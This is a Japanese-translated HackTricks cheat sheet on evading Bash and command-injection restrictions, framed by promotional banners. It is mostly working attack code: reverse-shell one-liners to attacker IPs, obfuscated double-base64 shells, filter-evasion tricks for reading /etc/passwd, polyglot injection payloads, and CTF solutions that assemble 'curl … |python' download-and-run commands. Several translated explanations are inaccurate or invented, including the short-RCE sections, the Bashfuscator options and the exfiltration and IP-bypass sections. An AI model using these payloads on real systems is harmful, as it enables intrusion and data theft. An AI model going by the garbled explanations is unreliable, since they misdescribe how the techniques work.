# Linux制限のバイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 一般的な制限のバイパス

### リバースシェル
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 短いリバースシェル

The following command can be used to create a short reverse shell in Bash:

以下のコマンドを使用して、短いリバースシェルをBashで作成できます。

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

Replace `ATTACKER_IP` with the IP address of the attacker machine and `ATTACKER_PORT` with the desired port number.

`ATTACKER_IP`を攻撃者のマシンのIPアドレスに、`ATTACKER_PORT`を希望するポート番号に置き換えてください。
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### パスと禁止ワードの回避方法

When performing a penetration test, it is common to encounter restrictions on certain paths or forbidden words that prevent the execution of commands. In such cases, it is necessary to find alternative ways to bypass these restrictions and continue with the testing.

以下のコマンドは、パスや禁止ワードの制限を回避するための代替手段を提供します。

#### 1. Using Absolute Paths

絶対パスを使用することで、制限されたパスを回避することができます。例えば、`/bin/ls`のように絶対パスを指定することで、`ls`コマンドを実行することができます。

```bash
/bin/ls
```

#### 2. Using Relative Paths

相対パスを使用することもできます。相対パスは、現在のディレクトリを基準にしたパスです。例えば、`./ls`のように相対パスを指定することで、`ls`コマンドを実行することができます。

```bash
./ls
```

#### 3. Using Environment Variables

環境変数を使用することもできます。環境変数は、特定の値を格納するための変数です。例えば、`$PATH`環境変数を使用することで、制限されたパス内のコマンドを実行することができます。

```bash
$PATH/ls
```

#### 4. Using Command Substitution

コマンド置換を使用することもできます。コマンド置換は、コマンドの出力を別のコマンドの引数として使用する方法です。例えば、`$(ls)`のようにコマンド置換を行うことで、`ls`コマンドの出力を別のコマンドに渡すことができます。

```bash
$(ls)
```

#### 5. Using Aliases

エイリアスを使用することもできます。エイリアスは、コマンドに別の名前を割り当てる方法です。例えば、`alias ls='echo hello'`のようにエイリアスを設定することで、`ls`コマンドを実行すると実際には`echo hello`が実行されます。

```bash
alias ls='echo hello'
```

These techniques can be used to bypass restrictions on paths and forbidden words, allowing you to continue with your penetration testing activities. However, it is important to note that bypassing restrictions may be against the terms of service or policies of the system you are testing, so always ensure you have proper authorization before attempting these techniques.

これらのテクニックを使用することで、パスや禁止ワードの制限を回避し、ペネトレーションテストの活動を続けることができます。ただし、制限を回避することは、テスト対象システムの利用規約やポリシーに違反する可能性があるため、これらのテクニックを試す前に適切な認可を取得することが重要です。
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 禁止されたスペースをバイパスする

In some cases, you may encounter restrictions that prevent you from using spaces in certain commands. However, there are ways to bypass these restrictions and execute commands that contain spaces.

以下の場合、特定のコマンドでスペースを使用することが制限されている場合があります。しかし、これらの制限をバイパスし、スペースを含むコマンドを実行する方法があります。

One method is to use alternative characters or escape sequences to represent spaces. For example, you can use a backslash (\) followed by a space (\ ) to represent a space character in a command.

一つの方法は、代替文字やエスケープシーケンスを使用してスペースを表現することです。例えば、コマンド内でスペース文字を表すために、バックスラッシュ (\) の後にスペース (\ ) を使用することができます。

```bash
$ ls\ -l
```

Another method is to enclose the command containing spaces within single quotes (''). This tells the shell to treat the entire command as a single argument, ignoring any spaces within it.

もう一つの方法は、スペースを含むコマンドをシングルクォート ('') で囲むことです。これにより、シェルはコマンド全体を単一の引数として扱い、その中のスペースを無視します。

```bash
$ ls '-l'
```

By using these techniques, you can bypass restrictions on using spaces in commands and execute them successfully.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### バックスラッシュとスラッシュをバイパスする

バックスラッシュとスラッシュをバイパスする方法について説明します。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### パイプをバイパスする

Pipes are a powerful feature in Linux that allow you to redirect the output of one command as the input of another command. However, in some cases, you may encounter restrictions that prevent you from using pipes. In this section, we will discuss a few techniques to bypass these restrictions and still make use of pipes.

パイプはLinuxの強力な機能であり、あるコマンドの出力を別のコマンドの入力としてリダイレクトすることができます。しかし、いくつかの場合には、パイプの使用が制限されていることがあります。このセクションでは、これらの制限をバイパスし、パイプを使用するためのいくつかのテクニックについて説明します。

#### Using process substitution

プロセス置換を使用する

Process substitution is a technique that allows you to treat the output of a command as a file. By using process substitution, you can bypass restrictions on pipes and still achieve the desired result.

プロセス置換は、コマンドの出力をファイルとして扱うことができるテクニックです。プロセス置換を使用することで、パイプの制限をバイパスし、目的の結果を得ることができます。

To use process substitution, you can use the `<()` syntax. For example, instead of using `command1 | command2`, you can use `command2 <(command1)`.

プロセス置換を使用するには、`<()` 構文を使用します。例えば、`command1 | command2` の代わりに `command2 <(command1)` を使用することができます。

#### Using temporary files

一時ファイルを使用する

Another way to bypass restrictions on pipes is to use temporary files. Instead of piping the output of one command directly to another command, you can redirect the output to a temporary file and then use that file as the input for the next command.

パイプの制限をバイパスする別の方法は、一時ファイルを使用することです。コマンドの出力を直接別のコマンドにパイプする代わりに、出力を一時ファイルにリダイレクトし、そのファイルを次のコマンドの入力として使用します。

For example, instead of using `command1 | command2`, you can use `command1 > temp_file && command2 < temp_file`. This way, you can still achieve the desired result even if pipes are restricted.

例えば、`command1 | command2` の代わりに `command1 > temp_file && command2 < temp_file` を使用することができます。この方法では、パイプが制限されていても、目的の結果を得ることができます。

These are just a few techniques to bypass restrictions on pipes. Depending on the specific situation, you may need to explore other methods or combinations of methods to achieve your desired outcome.

これらはパイプの制限をバイパスするためのいくつかのテクニックです。具体的な状況によっては、他の方法や方法の組み合わせを試す必要があるかもしれません。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 16進数エンコーディングを使用してバイパスする

Bashの制限を回避するために、16進数エンコーディングを使用することができます。これにより、特殊文字や制御文字をバイパスすることができます。

以下のコマンドは、16進数エンコーディングを使用して特殊文字をバイパスする例です。

```bash
$ echo -e "\x63\x61\x74 /etc/passwd" | bash
```

このコマンドでは、16進数エンコーディングを使用して文字列"\x63\x61\x74 /etc/passwd"を生成し、それを`echo`コマンドで表示します。そして、`|`パイプを使用して、生成された文字列を`bash`コマンドに渡します。

`bash`コマンドは、16進数エンコーディングされた文字列を解釈し、`cat /etc/passwd`コマンドとして実行します。これにより、制限された環境でさえも`/etc/passwd`ファイルの内容を表示することができます。

16進数エンコーディングを使用することで、特殊文字や制御文字を回避し、制限された環境での攻撃を実行することができます。ただし、このテクニックは環境によっては機能しない場合がありますので、注意が必要です。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### IPのバイパス

IP制限を回避するための方法をいくつか紹介します。

1. **VPNを使用する**: VPNを使用することで、自分のIPアドレスを隠すことができます。VPNサービスを利用して、別の場所からインターネットに接続することができます。

2. **プロキシサーバーを使用する**: プロキシサーバーを経由することで、自分のIPアドレスを隠すことができます。プロキシサーバーは、自分のIPアドレスを隠し、別のIPアドレスを使用してウェブサイトにアクセスすることができます。

3. **トークンベースの認証を使用する**: トークンベースの認証を使用することで、IP制限を回避することができます。トークンベースの認証は、ユーザーが特定のトークンを持っている場合にのみアクセスを許可する仕組みです。

これらの方法を使用することで、IP制限を回避することができます。ただし、これらの方法は法的な制約や倫理的な問題に注意しながら使用する必要があります。
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 時間ベースのデータの外部流出

Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system over a period of time. This technique is particularly useful when traditional methods of exfiltration, such as transferring large amounts of data at once, are not feasible or likely to be detected.

To perform time based data exfiltration, hackers can use various commands and tools available in Linux. Here are some useful Linux commands for bypassing Bash restrictions and executing time based data exfiltration:

1. **ping command**: The ping command can be used to send ICMP echo requests to a remote server. By manipulating the payload of the ping packets, hackers can encode and transmit data covertly. For example:

```bash
ping -c 1 -p "data_to_exfiltrate" <target_ip>
```

2. **nslookup command**: The nslookup command can be used to perform DNS lookups. By encoding data in the subdomains of a DNS query, hackers can exfiltrate data. For example:

```bash
nslookup data_to_exfiltrate.<domain_name> <dns_server>
```

3. **curl command**: The curl command can be used to transfer data using various protocols, such as HTTP or FTP. By encoding data in the URL or request headers, hackers can exfiltrate data. For example:

```bash
curl -H "X-Data: data_to_exfiltrate" <target_url>
```

4. **wget command**: The wget command can be used to download files from the internet. By encoding data in the URL or request headers, hackers can exfiltrate data. For example:

```bash
wget --header="X-Data: data_to_exfiltrate" <file_url>
```

These commands can be combined with other techniques, such as steganography or encryption, to further obfuscate the exfiltrated data and evade detection. It is important for system administrators to be aware of these techniques and implement appropriate security measures to prevent time based data exfiltration.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 環境変数から文字を取得する

環境変数は、システムの設定や実行中のプロセスに関する情報を格納するために使用されます。これには、ユーザー名、パスワード、APIキーなどの機密情報が含まれる場合があります。Bashシェルでは、環境変数を使用してこれらの情報を取得することができます。

以下のコマンドを使用して、環境変数から文字を取得できます。

```bash
echo $ENV_VARIABLE
```

ここで、`ENV_VARIABLE`は取得したい環境変数の名前です。このコマンドを実行すると、指定した環境変数の値が表示されます。

例えば、`API_KEY`という環境変数から文字を取得する場合、以下のようにコマンドを実行します。

```bash
echo $API_KEY
```

このコマンドを使用することで、環境変数から文字を取得することができます。ただし、機密情報を含む環境変数を使用する場合は、注意が必要です。機密情報が漏洩しないように、適切なセキュリティ対策を講じる必要があります。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNSデータの流出

例えば、**burpcollab**または[**pingb**](http://pingb.in)を使用することができます。

### 組み込み関数

外部関数を実行することができず、**RCEを取得するために制限された組み込み関数にアクセスできる場合**、いくつかの便利なトリックがあります。通常、**すべての組み込み関数を使用することはできない**ため、刑務所をバイパスするためにすべてのオプションを知っておく必要があります。[**devploit**](https://twitter.com/devploit)からのアイデアです。\
まず、すべての[**シェルの組み込み関数**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**を確認してください**。次に、以下はいくつかの**推奨事項**です：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### ポリグロットコマンドインジェクション

Polyglot command injection is a technique used to bypass restrictions imposed by the Bash shell. It involves injecting a command that can be interpreted by multiple programming languages, allowing an attacker to execute arbitrary commands on the target system.

To perform a polyglot command injection, the attacker needs to find a command that is valid in multiple languages. This can be achieved by using commands that have similar syntax and behavior across different programming languages.

For example, the following command can be interpreted as valid code in both PHP and Bash:

```bash
$(php -r 'echo "Hello, World!";')
```

In this case, the attacker can inject this command into a vulnerable application that executes user-supplied input in a Bash shell. The application will interpret the injected command as a valid PHP code and execute it, allowing the attacker to execute arbitrary PHP code on the target system.

By leveraging polyglot command injection, an attacker can bypass restrictions imposed by the Bash shell and execute arbitrary commands on the target system, potentially leading to unauthorized access, data leakage, or other security breaches. It is important for developers and system administrators to be aware of this technique and implement proper input validation and sanitization to prevent such attacks.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 正規表現の回避

To bypass potential regexes, you can try the following techniques:

正規表現を回避するために、以下のテクニックを試すことができます。

- Use character classes: Instead of using specific characters, you can use character classes to match a range of characters. For example, instead of using `[a-z]` to match lowercase letters, you can use `\w` to match any word character.

- 文字クラスの使用: 特定の文字を使用する代わりに、文字クラスを使用して文字の範囲に一致させることができます。例えば、小文字のアルファベットに一致させるために `[a-z]` を使用する代わりに、任意の単語文字に一致させるために `\w` を使用することができます。

- Modify the regex: Sometimes, modifying the regex pattern slightly can bypass certain restrictions. For example, if a regex pattern is blocking the use of the dot character (`.`), you can try using a different character or escaping the dot character (`\.`) to bypass the restriction.

- 正規表現の変更: 時には、正規表現パターンをわずかに変更することで特定の制限を回避することができます。例えば、正規表現パターンがドット文字 (`.`) の使用をブロックしている場合、別の文字を使用するか、ドット文字をエスケープする (`\.`) ことで制限を回避することができます。

- Use lookarounds: Lookarounds are zero-width assertions that allow you to match patterns based on what comes before or after the current position. By using lookarounds, you can bypass certain regex restrictions. For example, if a regex pattern is blocking the use of a specific word, you can use a positive lookbehind (`(?<=...)`) to match the word without including it in the final match.

- ルックアラウンドの使用: ルックアラウンドは、現在の位置の前後に基づいてパターンに一致させることができるゼロ幅アサーションです。ルックアラウンドを使用することで、特定の正規表現の制限を回避することができます。例えば、正規表現パターンが特定の単語の使用をブロックしている場合、肯定的な後読み (`(?<=...)`) を使用して、単語に一致させることができますが、最終的な一致には含まれません。

Remember, bypassing regexes should only be done for legitimate purposes and with proper authorization. Using these techniques for malicious activities is illegal and unethical.

正規表現の回避は、正当な目的と適切な権限を持ってのみ行うべきです。これらのテクニックを悪意のある活動に使用することは違法であり、倫理に反します。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscatorは、Bashスクリプトの制限を回避するためのツールです。これを使用すると、スクリプトの解析や検出を困難にすることができます。

#### インストール

Bashfuscatorをインストールするには、次のコマンドを実行します。

```bash
$ git clone https://github.com/Bashfuscator/Bashfuscator.git
$ cd Bashfuscator
$ sudo make install
```

#### 使用方法

Bashfuscatorを使用するには、次のコマンドを実行します。

```bash
$ bashfuscator <input_script> <output_script>
```

`<input_script>`は、変換したいBashスクリプトのパスを指定します。`<output_script>`は、変換後のスクリプトの保存先を指定します。

#### オプション

Bashfuscatorには、さまざまなオプションがあります。以下は一部のオプションの例です。

- `-o, --obfuscate`: スクリプトを難読化します。
- `-e, --encrypt`: スクリプトを暗号化します。
- `-c, --compress`: スクリプトを圧縮します。
- `-s, --split`: スクリプトを複数のファイルに分割します。

これらのオプションを組み合わせることで、さまざまな制限回避の手法を使用することができます。

#### 注意事項

Bashfuscatorは、スクリプトの解析を困難にするためのツールですが、完全なセキュリティを提供するものではありません。セキュリティを強化するためには、他の手法やツールとの組み合わせが必要です。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 5文字でのRCE

Bashの制限を回避するための5文字でのRCE（リモートコード実行）方法です。

```bash
$ echo $0
bash
```

上記のコマンドを実行すると、現在のシェルの名前が表示されます。この情報を利用して、制限を回避することができます。

```bash
$ PS1=$(echo -e "\x20\x28\x65\x63\x68\x6f\x20\x2d\x65\x20\x22\x24\x28\x65\x63\x68\x6f\x20\x24\x30\x29\x22\x29\x20\x23")
```

上記のコマンドを実行すると、PS1環境変数が設定されます。これにより、現在のシェルの名前が表示されるようになります。

```bash
$ echo $0
bash
```

制限を回避するためには、この方法を使用してシェルの名前を偽装することができます。
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4文字でのRCE

Bashの制限を回避するための4文字でのRCE（リモートコード実行）方法です。

```bash
$ echo $0
bash
```

上記のコマンドを実行すると、現在のシェルの名前が表示されます。この場合、シェルの名前は「bash」です。

```bash
$ echo $0|bash
```

上記のコマンドを実行すると、現在のシェルの名前を「bash」として実行します。これにより、Bashの制限を回避し、任意のコードを実行することができます。

この方法を使用すると、わずか4文字でRCEを実現することができます。ただし、セキュリティ上のリスクがあるため、慎重に使用する必要があります。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 読み取り専用/Noexec/Distroless バイパス

もし、**読み取り専用およびnoexecの保護**が有効なファイルシステム内にいる場合、またはdistrolessコンテナ内にいる場合でも、**任意のバイナリ、さらにはシェルを実行する方法**があります。

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chrootおよびその他のJails バイパス

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考文献とその他

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築および自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
